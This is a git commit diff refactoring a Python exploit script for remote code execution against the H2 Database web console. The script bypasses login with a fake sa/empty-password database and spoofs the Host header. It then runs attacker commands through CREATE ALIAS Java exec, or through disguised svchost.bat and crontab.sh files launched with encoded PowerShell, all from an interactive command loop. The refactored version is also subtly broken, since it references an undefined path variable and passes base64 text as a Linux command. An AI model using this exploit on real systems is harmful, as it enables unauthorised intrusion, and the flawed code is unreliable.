fa62854772856bb39779a2eb0422b47bbe215786
ViperXSec <146484902+ViperXSec@users.noreply.github.com>
2024-07-18 19:25:40 -0300

    Update ViperX_H2DB_RCE.py

--- ViperX_H2DB_RCE.py
+++ ViperX_H2DB_RCE.py
@@ -1,40 +1,19 @@
-"""
-# H2 Database - RCE  
-H2 Database (1.0 ~ 2.3.230) - Remote Code Execution
-
-H2 Database RCE - ViperX Offensive Security
-  Date: 17/07/2024
-
-The exploit flow operates with the following logic: 
-~ for versions <(1.4) we create a 'dummy' table, and write the output log into a C:\Windows\Tasks\svchost.bat file by using ("SCRIPT SIMPLE NODATA NOSETTINGS TO '{BAT_FULLPATH}')
-  '-> With this bat file we can perform remote code execution with Arbitrary File Writing vulnerability.
-  '-> for old versions we open the .bat file with "org.h2.util.StartBrowser.openURL" and for the newest one "org.h2.tools.Server.openBrowser"
-~ In case of versions >(1.4), we just perform JAVA Code Execution through 'CREATE ALIAS' function:
-  '->  CREATE FORCE ALIAS CMD_INJECT AS $$
-  void pwshInject() throws Exception {
-      Runtime.getRuntime().exec("%s");
-  }
-  $$;
-"""
 import requests
 import re
 import sys
+import base64
+import logging
+
+# Setup logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+# Constants
 TARGET_URL = "http://127.0.0.1:8082"
-FAKEDB_SA_NULL_PASSWORD = "jdbc:h2:~/test" # CHANGE HERE (default database ~/test)
-PLATFORM = "windows"
-if PLATFORM.lower() == "windows":
-    OUTPUT_DIRECTORY = "C:/Windows/Tasks"
-    BAT_FULLPATH = "C:/Windows/Tasks/svchost.bat"
-elif PLATFORM.lower() == "linux" or PLATFORM.lower() == "macos":
-    OUTPUT_DIRECTORY = "/dev/shm/"
-    SH_FULLPATH = "/dev/shm/crontab.sh"
-#COMMAND = "cmd.exe /C calc.exe"
-#COMMAND = "echo blabla > /dev/shm/o.txt"
-#################################################################################
-# 1st Stage - Auth Bypass - Generate and use a fake Database with sa:<null> credentials
-#    '-> Validade attacker [JESSIONID] token as a valid session
-url_auth_bypass = f"{TARGET_URL}/login.do"
-headers_auth_bypass = {
+FAKEDB_SA_NULL_PASSWORD = "jdbc:h2:~/test"  # Change as needed
+PLATFORM = "windows"  # Change as needed
+OUTPUT_DIRECTORY = "C:/Windows/Tasks" if PLATFORM.lower() == "windows" else "/dev/shm/"
+BAT_FULLPATH = "C:/Windows/Tasks/svchost.bat" if PLATFORM.lower() == "windows" else "/dev/shm/crontab.sh"
+HEADERS = {
     "Cache-Control": "max-age=0",
     "Host": "127.0.0.1",
     "Upgrade-Insecure-Requests": "1",
@@ -47,136 +26,105 @@ headers_auth_bypass = {
     "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
     "Connection": "keep-alive"
 }
-# 1 - Generate JSESSIONID token
-r = requests.get(url_auth_bypass, headers=headers_auth_bypass, verify=False)
-#print(r.text)
-JSESSIONID = re.findall(r"login.jsp\?jsessionid=(.*?)\';", r.text)[0]
-data_auth_bypass = {
-    "language": "en",
-    "setting": "Generic H2 (Server)",
-    "name": "Generic H2 (Server)",
-    "driver": "org.h2.Driver",
-    "url": f"{FAKEDB_SA_NULL_PASSWORD}",
-    "user": "sa",
-    "password": ''
-}
-# 2 - Validade JSESSIONID token as a valid session
-url_auth_bypass = f"{TARGET_URL}/login.do?jsessionid={JSESSIONID}"
-r = requests.post(url_auth_bypass, headers=headers_auth_bypass, data=data_auth_bypass, verify=False)
-#print(r.text)
-err1 = "not found, either pre-create it or allow remote database creation (not recommended in secure environments)"
-err2 = "is larger than the supported format"
-if err1 in r.text or err2 in r.text:
-    print(str(r.text))
-    print(f"\n\t[-] Could not get access to {FAKEDB_SA_NULL_PASSWORD} database!")
-    print(f"\t[!] Just change JDBC URL for another one!")
-    sys.exit(0)
-#################################################################################
-# 2st Stage - Execute [0day.exe]
-url_CMD_Query = f"{TARGET_URL}/query.do?jsessionid={JSESSIONID}"
-headers_CMD_Query = {
-    "Cache-Control": "max-age=0",
-    "Upgrade-Insecure-Requests": "1",
-    "Host": "127.0.0.1", # Bypass allowRemoteAccess Check
-    "Origin": f"{TARGET_URL}",
-    "Content-Type": "application/x-www-form-urlencoded",
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    "Referer": f"{TARGET_URL}/query.jsp?jsessionid={JSESSIONID}",
-    "Accept-Encoding": "gzip, deflate, br",
-    "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
-    "Connection": "keep-alive"
-}
-while True:
-    # shell execve
-    COMMAND = input("COMMAND> ")
-    import base64
-    # Encode the command in UTF-16LE
-    command_bytes = COMMAND.encode('utf-16le')
-    # Convert the bytes to a Base64 string
-    base64_command = base64.b64encode(command_bytes).decode('ascii')
 
-    # >=1.4? - Server.openBrowser -> Newer versions from H2 Database
-    # <=1.4? - StartBrowser.openURL -> Old versions
-    if PLATFORM.lower() == "windows":
-        SQL_old_ver_query = f"""-- H2 Database OLD versions RCE [1.1.101 ~ 1.4?] (https://code.google.com/archive/p/h2database/downloads?page=5)
--- 1st phase - Arbitrary File Upload
--- Drop the alias if it exists
-DROP ALIAS IF EXISTS PWSH_INJECT;
+def get_jsessionid():
+    url_auth_bypass = f"{TARGET_URL}/login.do"
+    response = requests.get(url_auth_bypass, headers=HEADERS, verify=False)
+    if response.status_code != 200:
+        logging.error("Failed to get JSESSIONID")
+        sys.exit(1)
+    
+    jsessionid_match = re.findall(r"login.jsp\?jsessionid=(.*?)\';", response.text)
+    if not jsessionid_match:
+        logging.error("JSESSIONID not found in response")
+        sys.exit(1)
+    
+    return jsessionid_match[0]
 
--- RCE - 0day.bat Payload with custom command 
-CREATE FORCE ALIAS PWSH_INJECT FOR "a.
-powershell -nop -ep bypass -enc {base64_command}
-";
-SCRIPT SIMPLE NODATA NOSETTINGS TO '{BAT_FULLPATH}';
-
--- 2nd phase - Arbitrary Execution
--- Create the alias for the StartBrowser function
-CREATE TABLE EXPLOIT(
-    ID INT PRIMARY KEY, 
-    NAME VARCHAR(255)
-);
-
--- Insert values into the table
-INSERT INTO EXPLOIT (ID, NAME) VALUES (1, 'file://{BAT_FULLPATH}');
-
--- Bruteforce for the correct vulnerable class
--- * org.h2.util.StartBrowser.openURL <1.4?
--- * org.h2.tools.Server.openBrowser
-
-CREATE FORCE ALIAS OPEN_URL FOR "org.h2.util.StartBrowser.openURL";
-CALL OPEN_URL(SELECT NAME FROM EXPLOIT);
-
-CREATE FORCE ALIAS OPEN_BROWSER FOR "org.h2.tools.Server.openBrowser";
-CALL OPEN_BROWSER(SELECT NAME FROM EXPLOIT);
-
--- Drop table exploit table
-DROP TABLE EXPLOIT;
-"""
-    elif PLATFORM == "linux" or PLATFORM == "macos":
-        SQL_old_ver_query = (f"""-- Create the alias for the StartBrowser function
--- H2 Database OLD versions RCE [1.1.101 ~ 1.4?] (https://code.google.com/archive/p/h2database/downloads?page=5)
--- 1st phase - Arbitrary File Upload
--- Drop the alias if it exists
-DROP ALIAS IF EXISTS PWSH_INJECT;
--- RCE - 0day.bat Payload with custom command
-CREATE FORCE ALIAS PWSH_INJECT FOR "a.
-{COMMAND}
-";
-SCRIPT SIMPLE NODATA NOSETTINGS TO '{SH_FULLPATH}';
--- 2nd phase - Arbitrary Execution
--- Create the alias for the StartBrowser function
-CREATE TABLE EXPLOIT(
-    ID INT PRIMARY KEY,
-    NAME VARCHAR(255)
-);
--- Insert values into the table
-INSERT INTO EXPLOIT (ID, NAME) VALUES (1, 'file://{SH_FULLPATH}');
--- Bruteforce for the correct vulnerable class
--- * org.h2.util.StartBrowser.openURL <1.4?
--- * org.h2.tools.Server.openBrowser
-CREATE FORCE ALIAS OPEN_URL FOR "org.h2.util.StartBrowser.openURL";
-CALL OPEN_URL(SELECT NAME FROM EXPLOIT);
-CREATE FORCE ALIAS OPEN_BROWSER FOR "org.h2.tools.Server.openBrowser";
-CALL OPEN_BROWSER(SELECT NAME FROM EXPLOIT);
--- Drop table exploit table
-DROP TABLE EXPLOIT;
-""")
-    SQL_new_ver_query = ("""-- H2 Database NEW versions RCE >=1.4?
--- Drop the alias if it exists
-DROP ALIAS IF EXISTS CMD_INJECT ;
--- Create the alias with the command
-CREATE FORCE ALIAS CMD_INJECT AS $$
-void pwshInject() throws Exception {
-    Runtime.getRuntime().exec("%s");
-}
-$$;
--- Execute the alias to run the command
-CALL CMD_INJECT();
-""" % COMMAND)
-    data_CMD_Query = {
-        "sql": SQL_old_ver_query + SQL_new_ver_query # bruteforce OLD + NEW versions
+def authenticate(jsessionid):
+    url_auth_bypass = f"{TARGET_URL}/login.do?jsessionid={jsessionid}"
+    data_auth_bypass = {
+        "language": "en",
+        "setting": "Generic H2 (Server)",
+        "name": "Generic H2 (Server)",
+        "driver": "org.h2.Driver",
+        "url": FAKEDB_SA_NULL_PASSWORD,
+        "user": "sa",
+        "password": ''
     }
-    #print(data_CMD_Query["sql"])
-    r = requests.post(url_CMD_Query, headers=headers_CMD_Query, data=data_CMD_Query)
-    #print(r.text)
+    
+    response = requests.post(url_auth_bypass, headers=HEADERS, data=data_auth_bypass, verify=False)
+    err1 = "not found, either pre-create it or allow remote database creation (not recommended in secure environments)"
+    err2 = "is larger than the supported format"
+    if err1 in response.text or err2 in response.text:
+        logging.error("Failed to authenticate to the database")
+        sys.exit(1)
+
+def execute_command(jsessionid, command):
+    url_cmd_query = f"{TARGET_URL}/query.do?jsessionid={jsessionid}"
+    headers_cmd_query = HEADERS.copy()
+    headers_cmd_query["Referer"] = f"{TARGET_URL}/query.jsp?jsessionid={jsessionid}"
+    
+    # Encode the command in UTF-16LE and convert to Base64
+    command_bytes = command.encode('utf-16le')
+    base64_command = base64.b64encode(command_bytes).decode('ascii')
+    
+    sql_old_ver_query = generate_sql_old_version(base64_command)
+    sql_new_ver_query = generate_sql_new_version(command)
+    
+    data_cmd_query = {
+        "sql": sql_old_ver_query + sql_new_ver_query
+    }
+    
+    response = requests.post(url_cmd_query, headers=headers_cmd_query, data=data_cmd_query)
+    if response.status_code != 200:
+        logging.error("Failed to execute command")
+        logging.debug(f"Response: {response.text}")
+
+def generate_sql_old_version(base64_command):
+    if PLATFORM.lower() == "windows":
+        return f"""-- H2 Database OLD versions RCE [1.1.101 ~ 1.4?]
+        DROP ALIAS IF EXISTS PWSH_INJECT;
+        CREATE FORCE ALIAS PWSH_INJECT FOR "a.
+        powershell -nop -ep bypass -enc {base64_command}
+        ";
+        SCRIPT SIMPLE NODATA NOSETTINGS TO '{BAT_FULLPATH}';
+        CREATE TABLE EXPLOIT(ID INT PRIMARY KEY, NAME VARCHAR(255));
+        INSERT INTO EXPLOIT (ID, NAME) VALUES (1, 'file://{BAT_FULLPATH}');
+        CREATE FORCE ALIAS OPEN_URL FOR "org.h2.util.StartBrowser.openURL";
+        CALL OPEN_URL(SELECT NAME FROM EXPLOIT);
+        CREATE FORCE ALIAS OPEN_BROWSER FOR "org.h2.tools.Server.openBrowser";
+        CALL OPEN_BROWSER(SELECT NAME FROM EXPLOIT);
+        DROP TABLE EXPLOIT;"""
+    else:
+        return f"""-- H2 Database OLD versions RCE [1.1.101 ~ 1.4?]
+        DROP ALIAS IF EXISTS PWSH_INJECT;
+        CREATE FORCE ALIAS PWSH_INJECT FOR "a.
+        {base64_command}
+        ";
+        SCRIPT SIMPLE NODATA NOSETTINGS TO '{SH_FULLPATH}';
+        CREATE TABLE EXPLOIT(ID INT PRIMARY KEY, NAME VARCHAR(255));
+        INSERT INTO EXPLOIT (ID, NAME) VALUES (1, 'file://{SH_FULLPATH}');
+        CREATE FORCE ALIAS OPEN_URL FOR "org.h2.util.StartBrowser.openURL";
+        CALL OPEN_URL(SELECT NAME FROM EXPLOIT);
+        CREATE FORCE ALIAS OPEN_BROWSER FOR "org.h2.tools.Server.openBrowser";
+        CALL OPEN_BROWSER(SELECT NAME FROM EXPLOIT);
+        DROP TABLE EXPLOIT;"""
+
+def generate_sql_new_version(command):
+    return f"""-- H2 Database NEW versions RCE >=1.4?
+    DROP ALIAS IF EXISTS CMD_INJECT ;
+    CREATE FORCE ALIAS CMD_INJECT AS $$
+    void pwshInject() throws Exception {{
+        Runtime.getRuntime().exec("{command}");
+    }}
+    $$;
+    CALL CMD_INJECT();"""
+
+if __name__ == "__main__":
+    jsessionid = get_jsessionid()
+    authenticate(jsessionid)
+    
+    while True:
+        command = input("COMMAND> ")
+        execute_command(jsessionid, command)
